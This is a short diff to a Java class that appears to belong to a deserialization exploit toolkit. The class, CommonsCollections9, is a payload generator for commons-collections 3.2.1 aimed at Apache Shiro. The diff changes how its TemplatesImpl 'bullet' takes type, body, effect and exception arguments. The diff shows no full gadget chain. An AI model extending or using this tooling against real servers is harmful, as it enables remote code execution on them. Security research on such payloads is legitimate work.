@@ -23,7 +23,7 @@ import java.util.Map;
 @SuppressWarnings({"rawtypes","unchecked"})
 @Payloads
 @Targets({Targets.JDK})
-@Dependencies({"commons-collections:commons-collections:3.2.1","for shiro"})
+@Dependencies({"commons-collections:commons-collections:3.2.1","special for shiro"})
 @Require(bullets = {"TemplatesImplBullet"}, param = false)
 @Authors({ Authors.WH1T3P1G })
 public class CommonsCollections9 extends AbstractPayload<HashSet> {
@@ -35,7 +35,12 @@ public class CommonsCollections9 extends AbstractPayload<HashSet> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
-        return new TemplatesImplBullet().set("body", args[0]);
+        Bullet bullet = new TemplatesImplBullet();
+        bullet.set("type", args[0]);
+        bullet.set("body", args[1]);
+        bullet.set("effect", args[2]);
+        bullet.set("exception", args[3]);
+        return bullet;
     }
 
     @Override
